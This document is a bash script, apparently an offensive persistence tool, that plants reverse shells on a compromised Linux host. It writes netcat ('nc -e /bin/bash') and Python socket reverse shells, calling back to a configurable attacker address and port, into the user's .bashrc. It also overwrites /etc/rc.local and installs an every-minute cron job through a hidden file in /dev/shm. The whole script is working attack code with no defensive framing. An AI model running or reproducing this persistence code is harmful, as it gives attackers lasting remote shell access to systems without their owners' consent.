#!/bin/bash

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"

if $(which python | grep -qi python)
then
	python=yes
fi

if $(which nc | grep -qi nc)
then
	nc=yes
fi

if [ ! -f "/etc/rc.local" ];
then
	rclocal=yes
fi

if $(env | grep -qi HOME)
then
	home=yes
fi

if $(which crontab | grep -qi crontab)
then
	crontab=yes
fi

if [[ $home == "yes" ]];
then
	if [[ $nc == "yes" ]];
	then
		touch ~/.bashrc
		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
		if $(grep nc ~/.bashrc | grep $attackBox | grep -qi $attackPort);
		then
			echo "[+] Netcat reverse shell placed in $USER's bashrc"
			echo "[+] Calls back to $attackBox:$attackPort"
		fi
	fi
	if [[ $python == "yes" ]];
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		if $(grep python ~/.bashrc | grep $attackBox | grep -qi $attackPort)
		then
			echo "[+] Python reverse shell placed in $USER's bashrc"
			echo "[+] Calls back to $attackBox:$attackPort"
		fi
	fi

fi

if [[ $rclocal == "yes" ]];
then
	if [[ $python == "yes" ]];
	then
		if [[ $python == $nc ]];
		then
			echo "/bin/sh -e" > /etc/rc.local &&
			echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /etc/rc.local 2> /dev/null &&
			echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local 2> /dev/null &&
			echo "exit 0" >> /etc/rc.local 2> /dev/null &&
			echo "[+] Netcat reverse shell placed in /etc/rc.local" &&
			echo "[+] Calls back to $attackBox:$attackPort" &&
			echo "[+] Python reverse shell placed in /etc/rc.local" &&
			echo "[+] Calls back to $attackBox:$attackPort"
		elif [[ $python != $nc ]];
		then
			echo "/bin/sh -e\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" > /etc/rc.local 2> /dev/null &&
			echo "[+] Python reverse shell placed in /etc/rc.local" &&
			echo "[+] Calls back to $attackBox:$attackPort"
		fi
	elif [[ $nc == "yes" ]];
	then
		echo "/bin/sh -e\nnc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001\nexit 0" > /etc/rc.local 2> /dev/null &&
		echo "[+] Netcat reverse shell placed in /etc/rc.local" &&
		echo "[+] Calls back to $attackBox:$attackPort"
	fi
fi

if [[ $crontab == "yes" ]];
then
	crontab -l > /dev/shm/.cron.sh
	if [[ $python == "yes" ]];
	then
		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
	fi
	if [[ $nc == "yes" ]];
	then
		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
	fi
	crontab /dev/shm/.cron.sh
	rm /dev/shm/.cron.sh
	echo "[+] This is the crontab you just installed for $(whoami)"
	crontab -l
fi
